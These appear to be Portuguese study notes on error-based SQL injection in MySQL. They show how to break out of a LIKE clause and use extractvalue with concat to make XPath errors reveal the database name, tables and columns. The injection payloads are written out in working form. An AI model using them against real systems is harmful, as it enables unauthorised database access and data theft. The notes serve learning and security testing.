A intenção aqui é gerar um erro para podermos analisar uma parte da query e/ou rodar **comandos baseados em erro**.

Existem queries no SQL que rodam baseados em erro, ou seja, caso um erro sela gerado ela é executada.

**Temos como exemplo essa query.**
```sql
SELECT * FROM produtos WHERE title LIKE '%<VALOR>%' OR description LIKE '%<VALOR>%'
```

Temos que ter uma noção de como funciona a query para podermos ser bem sucedidos.

Como a query utiliza o operador ``LIKE`` com ``'%<VALOR>%'``, podemos encerrar essa parte colocando `%' -- -`, e então a query ficaria assim.

```sql
SELECT * FROM produtos WHERE title LIKE '%%' -- -%' OR description LIKE '%<VALOR>%'
```

Após isso podemos injetar nossos comandos como
- `ExtractValue`
- `union`
- `concat`

O ``extractvalue`` é uma função que podemos usar para poder selecionar algo no banco de dados com ``xpath notation``, caso haja erro no ``xpath notation`` ele mostrará o porquê ele deu erro e executará o resultado da query nele.

o ``concat`` é uma função concatena valores e resultados de queries, com ele podemos colocar um ``LF`` ou ``CR``, que caso seja usado dentro do ``extractvalue``, criará um erro no ``xpath notation``.

---

**Temos como exemplo essa query.**
```sql
SELECT * FROM produtos WHERE title LIKE '%<VALOR>%' OR description LIKE '%<VALOR>%'
```

Poderíamos colocar a seguinte payload :
```sql
extractvalue("", concat(0x0a, (SELECT database())))
```

Ficaria assim :
```sql
SELECT * FROM produtos WHERE title LIKE '%%' and extractvalue("", concat(0x0a, ((SELECT database()))) -- -%' OR description LIKE '%<VALOR>%'
```
![[Pasted image 20241002091835.png]]

Para pegar as tabelas :
```sql
select table_name from information_schema.tables where table_schema='cs' limit 0,1
```
![[Pasted image 20241002093137.png]]

Para pegar as colunas :
```sql
select column_name from information_schema.columns where table_name='products' limit 0,1
```
![[Pasted image 20241002093236.png]]










